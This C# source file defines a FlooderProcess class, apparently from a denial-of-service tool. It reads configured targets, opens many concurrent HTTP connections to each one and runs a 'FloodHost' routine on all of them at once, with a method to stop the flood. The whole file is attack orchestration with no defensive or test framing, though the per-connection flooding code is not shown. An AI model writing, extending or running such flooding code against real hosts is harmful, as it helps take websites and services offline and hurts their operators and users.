internal class FlooderProcess
{
    private readonly Configuration _configuration;
    private readonly List<LimitedHttpConnection> _connections;
    private readonly List<Task> _tasks;

    private bool _isFlooding;
    private Thread? _floodingThread;
    public bool IsFlooding { get => _isFlooding; }

    public FlooderProcess(Configuration configuration)
    {
        _configuration = configuration;
        _connections = new List<LimitedHttpConnection>();
        _tasks = new List<Task>();
    }

    public void BeginFlood()
    {
        _isFlooding = true;
        _floodingThread = new (async () =>
        {
            foreach (TargetInfo target in _configuration.targets)
            {
                for (int i = 0; i < target.concurrency; i++)
                {
                    var connection = new LimitedHttpConnection(target);
                    _connections.Add(connection);
                    _tasks.Add(connection.FloodHost());
                }
            }
            await Task.WhenAll(_tasks.ToArray()).ContinueWith(t => _isFlooding = false);
        });
        _floodingThread.Start();
    }

    public void Stop()
    {
        foreach(var connection in _connections)
        {
            connection.Stop();
        }
        _floodingThread!.Join(1000);
    }
}